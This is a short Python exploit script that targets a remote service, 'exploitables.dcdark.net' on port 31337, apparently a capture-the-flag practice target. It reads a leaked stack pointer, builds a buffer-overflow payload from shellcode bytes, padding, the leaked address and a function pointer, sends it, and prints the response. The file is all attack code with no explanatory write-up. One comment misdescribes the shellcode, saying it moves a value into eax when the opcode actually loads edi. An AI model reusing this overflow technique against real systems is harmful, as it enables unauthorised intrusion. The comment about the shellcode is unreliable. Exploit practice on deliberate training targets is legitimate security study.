import socket
from struct import pack, unpack


def build_binary(sp):
    all_b = []
    binary = b"\xBF\x41\x41\x41\x41\xC3\x00\x00"  # mov 0x41414141 into eax
    binary += b"\x00" * 16  #padding
    #exploit buffer allows for 16 bytes
    binary += sp  #stack pointer - needs to come from server
    binary += b"\x20\x10\x40\x00\x00\x00\x00\x00"  #pointer to .dec()
    return binary


hostname = 'exploitables.dcdark.net'
port = 31337

print('Attempting to establish socket...')
s = socket.socket()
s.connect((hostname, port))
print('Socket established.')

#exploit code
#print('Send newline to get stack pointer')
#s.send(b'\x0a')
print('Getting stack pointer')
line = s.recv(65535)
print("Stack Pointer: " + str(line))
int_version = int(line, 16)
print("Int of stack pointer: " + str(int_version))
sp = pack('<Q', int_version)
print("verifying hex sp is right: " + hex(unpack('<Q', sp)[0]))
print('LE: ' + str(sp))
exploit = build_binary(sp)
print('exploit: ' + str(exploit))
s.send(exploit)
s.send(b'\x0a')
print('Waiting for response')
print(s.recv(65535))
